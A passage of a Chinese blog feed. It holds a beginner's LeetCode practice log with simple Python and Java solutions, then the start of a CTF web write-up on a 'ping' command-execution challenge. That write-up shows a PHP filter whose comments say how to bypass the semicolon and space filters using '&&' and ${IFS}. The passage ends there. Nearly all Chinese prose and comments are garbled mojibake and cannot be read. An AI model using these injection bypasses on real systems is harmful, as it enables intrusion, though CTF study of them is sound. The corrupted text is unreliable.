    <content type="html"><![CDATA[<p>ä»£ç èƒ½åŠ›å¤ªå·®äº†ï¼Œåœ¨leetCodeä¸Šåšç‚¹ç®€å•çš„é¢˜ã€‚è®°å½•ä¸€ä¸‹ğŸ˜€</p><span id="more"></span><hr><p>ä»£ç èƒ½åŠ›å®Œå…¨æ˜¯å…¥é—¨çº§åˆ«ã€‚ã€‚åªä¼šå†™ç‚¹å¼‚å¸¸ç®€å•çš„ä¸œè¥¿ï¼Œå‡†å¤‡åšç‚¹é¢˜æå‡ä¸‹èƒ½åŠ›ã€‚</p><p>åœ¨åšé¢˜è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¼šå°½å¯èƒ½ä½¿ç”¨æˆ‘æ¥è§¦è¿‡çš„<code>python</code>,<code>java</code>,<code>c++</code>æ¥è§£é¢˜ã€‚</p><p>å½“ç„¶ï¼Œâ€œå°½å¯èƒ½â€ï¼Œå†™ä¸å†™çš„å‡ºæ¥å°±æ˜¯å¦å¤–ä¸€å›äº‹äº†</p><h2 id="1-ä¸¤æ•°ä¹‹å’Œ"><a href="#1-ä¸¤æ•°ä¹‹å’Œ" class="headerlink" title="1.ä¸¤æ•°ä¹‹å’Œ"></a>1.ä¸¤æ•°ä¹‹å’Œ</h2><p>æè¿°ï¼šç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ <code>nums</code> å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼ <code>target</code>ï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡º <strong>å’Œä¸ºç›®æ ‡å€¼</strong> <em><code>target</code></em> çš„é‚£ <strong>ä¸¤ä¸ª</strong> æ•´æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚</p><p>ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œæ•°ç»„ä¸­åŒä¸€ä¸ªå…ƒç´ åœ¨ç­”æ¡ˆé‡Œä¸èƒ½é‡å¤å‡ºç°ã€‚</p><p>ä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚</p><p>æ€è·¯å°±æ˜¯éå†ç»™å®šæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œè®©ä»–ä»¬éƒ½åŠ ä¸€éï¼Œä¸¤æ•°ä¹‹å’Œè¿›<code>if</code>æ¡ä»¶åˆ¤æ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">twoSum</span>(<span class="hljs-params">self, nums, target</span>):<br>        listlen = <span class="hljs-built_in">len</span>(nums)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(listlen):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(listlen):<br>                <span class="hljs-keyword">if</span> nums[i] + nums[j] == target:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Answer: <span class="hljs-subst">&#123;i&#125;</span>, <span class="hljs-subst">&#123;j&#125;</span>!&quot;</span>)<br><br>nums = [<span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>]<br>target = <span class="hljs-number">9</span><br><br>solution = Solution()<br>solution.twoSum(nums, target)<br>                <br><span class="hljs-comment"># è¾“å‡ºï¼šAnswer: 0, 1!</span><br><span class="hljs-comment">#      Answer: 1, 0!</span><br></code></pre></td></tr></table></figure><p><code>java</code>çš„ä¸ä¼šå†™~ç›´æ¥çœ‹äº†å®˜æ–¹ç­”æ¡ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] twoSum(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> target) &#123;<span class="hljs-comment">//å®šä¹‰äº†ä¸€ä¸ªtwoSumæ–¹æ³•ï¼Œè¿”å›ç±»å‹ä¸ºint[],è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªæ•´æ•°æ•°ç»„numså’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼targetä½œä¸ºå‚æ•°</span><br>     <span class="hljs-comment">//javaå®šä¹‰æ–¹æ³•ï¼šè®¿é—®ä¿®é¥°ç¬¦ è¿”å›ç±»å‹ æ–¹æ³•å(å‚æ•°åˆ—è¡¨)</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.length;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<span class="hljs-comment">//for (åˆå§‹åŒ–è¯­å¥; å¾ªç¯æ¡ä»¶; æ›´æ–°è¯­å¥)ï¼Œ++iæ˜¯å‰ç¼€è‡ªå¢</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> i + <span class="hljs-number">1</span>; j &lt; n; ++j) &#123;<br>                <span class="hljs-keyword">if</span> (nums[i] + nums[j] == target) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;i, j&#125;;<span class="hljs-comment">//èŠ±æ‹¬å·åˆ›å»ºæ•°ç»„</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">0</span>];<span class="hljs-comment">//å‡å¦‚æ‰¾ä¸åˆ°ä¼šè¿”å›ä¸€ä¸ªç©ºçš„æ•´æ•°æ•°ç»„</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//https://leetcode.cn/problems/two-sum/</span><br><br></code></pre></td></tr></table></figure><h2 id="2-æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­—ä¸²"><a href="#2-æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­—ä¸²" class="headerlink" title="2.æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­—ä¸²"></a>2.æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­—ä¸²</h2><p>åšé¢˜æ„Ÿå—ï¼šæˆ‘æ˜¯SB</p><p>ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² <code>s</code> ï¼Œè¯·ä½ æ‰¾å‡ºå…¶ä¸­ä¸å«æœ‰é‡å¤å­—ç¬¦çš„ <strong>æœ€é•¿å­ä¸²</strong> çš„é•¿åº¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">length_of_longest_substring</span>(<span class="hljs-params">s</span>):<br>    char_dict = &#123;&#125;  <span class="hljs-comment"># è®°å½•æ¯ä¸ªå­—ç¬¦æœ€åä¸€æ¬¡å‡ºç°çš„ç´¢å¼•ä½ç½®</span><br>    start = <span class="hljs-number">0</span>  <span class="hljs-comment"># å­ä¸²çš„èµ·å§‹ä½ç½®</span><br>    end = <span class="hljs-number">0</span>  <span class="hljs-comment"># å­ä¸²çš„ç»“æŸä½ç½®</span><br>    max_length = <span class="hljs-number">0</span>  <span class="hljs-comment"># æœ€é•¿å­ä¸²çš„é•¿åº¦</span><br><br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(s):<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> char_dict <span class="hljs-keyword">and</span> char_dict[char] &gt;= start:<br>            start = char_dict[char] + <span class="hljs-number">1</span><br>        end = i<br>        char_dict[char] = i<br>        max_length = <span class="hljs-built_in">max</span>(max_length, end - start + <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> max_length<br><br></code></pre></td></tr></table></figure><h2 id="3-è®¡ç®—åˆ—è½¦åˆ°ç«™æ—¶é—´"><a href="#3-è®¡ç®—åˆ—è½¦åˆ°ç«™æ—¶é—´" class="headerlink" title="3.è®¡ç®—åˆ—è½¦åˆ°ç«™æ—¶é—´"></a>3.è®¡ç®—åˆ—è½¦åˆ°ç«™æ—¶é—´</h2><p>ç»™ä½ ä¸€ä¸ªæ­£æ•´æ•° <code>arrivalTime</code> è¡¨ç¤ºåˆ—è½¦æ­£ç‚¹åˆ°ç«™çš„æ—¶é—´ï¼ˆå•ä½ï¼šå°æ—¶ï¼‰ï¼Œå¦ç»™ä½ ä¸€ä¸ªæ­£æ•´æ•° <code>delayedTime</code> è¡¨ç¤ºåˆ—è½¦å»¶è¯¯çš„å°æ—¶æ•°ã€‚</p><p>è¿”å›åˆ—è½¦å®é™…åˆ°ç«™çš„æ—¶é—´ã€‚</p><p>æ³¨æ„ï¼Œè¯¥é—®é¢˜ä¸­çš„æ—¶é—´é‡‡ç”¨ 24 å°æ—¶åˆ¶ã€‚</p><p>æ€è·¯å°±æ˜¯æ±‚å’Œå–æ¨¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getReal</span>(<span class="hljs-params">self</span>):<br>        arrivalTime = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥åˆ—è½¦æ­£ç‚¹åˆ°ç«™æ—¶é—´ï¼š&quot;</span>))<br>        delayedTime = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥åˆ—è½¦å»¶è¯¯çš„å°æ—¶æ•°ï¼š&quot;</span>))<br>        realTime = (arrivalTime + delayedTime) % <span class="hljs-number">24</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;åˆ—è½¦æœ¬è¯¥åœ¨<span class="hljs-subst">&#123;arrivalTime&#125;</span>ç‚¹åˆ°ç«™ï¼Œä½†å»¶è¯¯äº†<span class="hljs-subst">&#123;delayedTime&#125;</span>å°æ—¶ï¼Œæ‰€ä»¥å®é™…åˆ°ç«™æ—¶é—´ä¸º<span class="hljs-subst">&#123;realTime&#125;</span>ç‚¹!&quot;</span>)<br><br><span class="hljs-comment"># å®ä¾‹åŒ–Solutionç±»</span><br>solution = Solution()<br><span class="hljs-comment"># è°ƒç”¨getRealæ–¹æ³•</span><br>solution.getReal()<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">//java</span><br><span class="hljs-comment">//Main.java</span><br><br><span class="hljs-keyword">import</span> java.util.Scanner;  <span class="hljs-comment">//åˆ©ç”¨Scannerç±»è¯»å–è¾“å…¥</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <span class="hljs-comment">//ç±»ä¸æ–‡ä»¶åä¿æŒä¸€è‡´</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<span class="hljs-comment">//åˆ›å»ºäº†ä¸€ä¸ªåä¸ºscannerçš„Scannerå¯¹è±¡ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºä»æ ‡å‡†è¾“å…¥æµï¼ˆSystem.inï¼‰ä¸­è¯»å–æ•°æ®</span><br><br>        System.out.print(<span class="hljs-string">&quot;è¯·è¾“å…¥åˆ—è½¦æ­£ç‚¹åˆ°ç«™æ—¶é—´ï¼š&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">arrivalTime</span> <span class="hljs-operator">=</span> scanner.nextInt();<br><br>        System.out.print(<span class="hljs-string">&quot;è¯·è¾“å…¥åˆ—è½¦å»¶è¯¯çš„å°æ—¶æ•°ï¼š&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">delayedTime</span> <span class="hljs-operator">=</span> scanner.nextInt();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">realTime</span> <span class="hljs-operator">=</span> (arrivalTime + delayedTime) % <span class="hljs-number">24</span>;<br>        System.out.println(<span class="hljs-string">&quot;åˆ—è½¦æœ¬è¯¥åœ¨&quot;</span> + arrivalTime + <span class="hljs-string">&quot;ç‚¹åˆ°ç«™ï¼Œä½†å»¶è¯¯äº†&quot;</span> + delayedTime + <span class="hljs-string">&quot;å°æ—¶ï¼Œæ‰€ä»¥å®é™…åˆ°ç«™æ—¶é—´ä¸º&quot;</span> + realTime + <span class="hljs-string">&quot;ç‚¹!&quot;</span>);<br><br>        scanner.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="4-ç½—é©¬æ•°å­—è½¬æ•´æ•°"><a href="#4-ç½—é©¬æ•°å­—è½¬æ•´æ•°" class="headerlink" title="4.ç½—é©¬æ•°å­—è½¬æ•´æ•°"></a>4.ç½—é©¬æ•°å­—è½¬æ•´æ•°</h2><p>ç½—é©¬æ•°å­—åŒ…å«ä»¥ä¸‹ä¸ƒç§å­—ç¬¦: <code>I</code>ï¼Œ <code>V</code>ï¼Œ <code>X</code>ï¼Œ <code>L</code>ï¼Œ<code>C</code>ï¼Œ<code>D</code> å’Œ <code>M</code>ã€‚</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">å­—ç¬¦          æ•°å€¼<br><span class="hljs-built_in">I</span>             <span class="hljs-number">1</span><br><span class="hljs-variable">V</span>             <span class="hljs-number">5</span><br><span class="hljs-variable">X</span>             <span class="hljs-number">10</span><br><span class="hljs-variable">L</span>             <span class="hljs-number">50</span><br><span class="hljs-built_in">C</span>             <span class="hljs-number">100</span><br><span class="hljs-built_in">D</span>             <span class="hljs-number">500</span><br><span class="hljs-variable">M</span>             <span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œ ç½—é©¬æ•°å­— <code>2</code> å†™åš <code>II</code> ï¼Œå³ä¸ºä¸¤ä¸ªå¹¶åˆ—çš„ 1 ã€‚<code>12</code> å†™åš <code>XII</code> ï¼Œå³ä¸º <code>X</code> + <code>II</code> ã€‚ <code>27</code> å†™åš <code>XXVII</code>, å³ä¸º <code>XX</code> + <code>V</code> + <code>II</code> ã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œç½—é©¬æ•°å­—ä¸­å°çš„æ•°å­—åœ¨å¤§çš„æ•°å­—çš„å³è¾¹ã€‚ä½†ä¹Ÿå­˜åœ¨ç‰¹ä¾‹ï¼Œä¾‹å¦‚ 4 ä¸å†™åš <code>IIII</code>ï¼Œè€Œæ˜¯ <code>IV</code>ã€‚æ•°å­— 1 åœ¨æ•°å­— 5 çš„å·¦è¾¹ï¼Œæ‰€è¡¨ç¤ºçš„æ•°ç­‰äºå¤§æ•° 5 å‡å°æ•° 1 å¾—åˆ°çš„æ•°å€¼ 4 ã€‚åŒæ ·åœ°ï¼Œæ•°å­— 9 è¡¨ç¤ºä¸º <code>IX</code>ã€‚è¿™ä¸ªç‰¹æ®Šçš„è§„åˆ™åªé€‚ç”¨äºä»¥ä¸‹å…­ç§æƒ…å†µï¼š</p><ul><li><code>I</code> å¯ä»¥æ”¾åœ¨ <code>V</code> (5) å’Œ <code>X</code> (10) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 4 å’Œ 9ã€‚</li><li><code>X</code> å¯ä»¥æ”¾åœ¨ <code>L</code> (50) å’Œ <code>C</code> (100) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 40 å’Œ 90ã€‚ </li><li><code>C</code> å¯ä»¥æ”¾åœ¨ <code>D</code> (500) å’Œ <code>M</code> (1000) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 400 å’Œ 900ã€‚</li></ul><p>ç»™å®šä¸€ä¸ªç½—é©¬æ•°å­—ï¼Œå°†å…¶è½¬æ¢æˆæ•´æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">romanToInt</span>(<span class="hljs-params">self, luoma</span>):<br>        roman_map = &#123;<span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-number">500</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-number">1000</span>&#125;<br>        result = <span class="hljs-number">0</span><br>        prev_value = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> luoma:<br>            value = roman_map[char]<br>            <span class="hljs-keyword">if</span> value &gt; prev_value:<br>                result += value - <span class="hljs-number">2</span> * prev_value<br>            <span class="hljs-keyword">else</span>:<br>                result += value<br>            prev_value = value<br>        <span class="hljs-keyword">return</span> result<br><br>s = Solution()<br>input_roman = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥ä¸€ä¸ªç½—é©¬æ•°å­—ï¼š&quot;</span>)<br><span class="hljs-built_in">print</span>(s.romanToInt(input_roman))<br><br></code></pre></td></tr></table></figure><h2 id="5-å›æ–‡æ•°"><a href="#5-å›æ–‡æ•°" class="headerlink" title="5.å›æ–‡æ•°"></a>5.å›æ–‡æ•°</h2><p>ç»™ä½ ä¸€ä¸ªæ•´æ•° <code>x</code> ï¼Œå¦‚æœ <code>x</code> æ˜¯ä¸€ä¸ªå›æ–‡æ•´æ•°ï¼Œè¿”å› <code>true</code> ï¼›å¦åˆ™ï¼Œè¿”å› <code>false</code> ã€‚</p><p>å›æ–‡æ•°æ˜¯æŒ‡æ­£åºï¼ˆä»å·¦å‘å³ï¼‰å’Œå€’åºï¼ˆä»å³å‘å·¦ï¼‰è¯»éƒ½æ˜¯ä¸€æ ·çš„æ•´æ•°ã€‚</p><ul><li>ä¾‹å¦‚ï¼Œ<code>121</code> æ˜¯å›æ–‡ï¼Œè€Œ <code>123</code> ä¸æ˜¯ã€‚</li></ul><p>æ€è·¯å°±æ˜¯å…ˆæŠŠæ•°å­—è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œç„¶åè®¡ç®—é•¿åº¦åˆ©ç”¨åˆ‡ç‰‡åˆ†åˆ«è¿”å›æ­£åºå€’åºçš„ç»“æœã€‚åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ç„¶åè¾“å‡ºã€‚</p><p>ä¸€å¼€å§‹è¿˜æ˜¯æƒ³åˆ©ç”¨<code>input</code>å‡½æ•°æç¤ºç”¨æˆ·è¾“å…¥ï¼Œç„¶ååˆ©ç”¨<code>Int</code>è½¬æ¢ä¸ºæ•´æ•°ï¼Œå†åˆ©ç”¨<code>str</code>è½¬æˆå­—ç¬¦ä¸²ï¼Œåæ¥è§‰å¾—æ²¡ä»»ä½•å¿…è¦ã€‚ã€‚ç›´æ¥<code>number = input(&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—ã€‚æˆ‘ä¼šåˆ¤æ–­æ˜¯ä¸æ˜¯å›æ–‡æ•°ï¼š&quot;)</code>å°±è¡Œã€‚ç„¶ååˆ©ç”¨<code>len</code>å‡½æ•°è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ï¼Œå†åˆ©ç”¨åˆ‡ç‰‡å»çœ‹æ­£åºå€’åºç»“æœï¼Œ<code>if</code>åˆ¤æ–­ç„¶åè¾“å…¥å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_it</span>(<span class="hljs-params">self,num</span>):<br>        zhengxv = num[::]<br>        daoxv = num[::-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> zhengxv == daoxv:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num&#125;</span>æ˜¯ä¸€ä¸ªå›æ–‡æ•°&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num&#125;</span>ä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°&quot;</span>)<br>            <br>s = Solution()<br>num =  <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—ã€‚æˆ‘ä¼šåˆ¤æ–­æ˜¯ä¸æ˜¯å›æ–‡æ•°ï¼š&quot;</span>)<br><span class="hljs-built_in">print</span>(s.check_it(num))<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">check_it</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">numStr</span> <span class="hljs-operator">=</span> String.valueOf(num);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">reverseNumStr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(numStr).reverse().toString();<br>        <span class="hljs-keyword">if</span> (numStr.equals(reverseNumStr)) &#123;<br>            System.out.println(num + <span class="hljs-string">&quot; æ˜¯ä¸€ä¸ªå›æ–‡æ•°&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(num + <span class="hljs-string">&quot; ä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Solution</span> <span class="hljs-variable">solution</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Solution</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">12321</span>; <br>        solution.check_it(num);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_0xGame_Week1</title>
    <link href="/2023/09/18/ko1/"/>
    <url>/2023/09/18/ko1/</url>
    
    <content type="html"><![CDATA[<p>èœé¸Ÿçš„Write_upï¼Œåªæ¥è§¦è¿‡web</p><span id="more"></span><h1 id="webéƒ¨åˆ†"><a href="#webéƒ¨åˆ†" class="headerlink" title="webéƒ¨åˆ†"></a>webéƒ¨åˆ†</h1><h3 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h3><p>æ ¹æ®é¢˜ç›®æƒ³åˆ°å¯èƒ½æ˜¯RCEï¼š</p><p><img src="/img/ping1.png" alt="ping1"></p><p>çœ‹ä¸‹æºç å‘ç°æç¤ºï¼š<code>&lt;!-- visit &#39;/api.php?source&#39; for hint --&gt;</code>,è®¿é—®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//;è¿‡æ»¤å¯ä»¥ç”¨å…¶å®ƒåˆ†éš”ç¬¦ç»•è¿‡ï¼Œæ¯”å¦‚&amp;&amp;å•¥çš„</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//ç©ºæ ¼è¿‡æ»¤å¯ä»¥ç”¨$&#123;IFS&#125;å•¥çš„ç»•è¿‡</span><br>    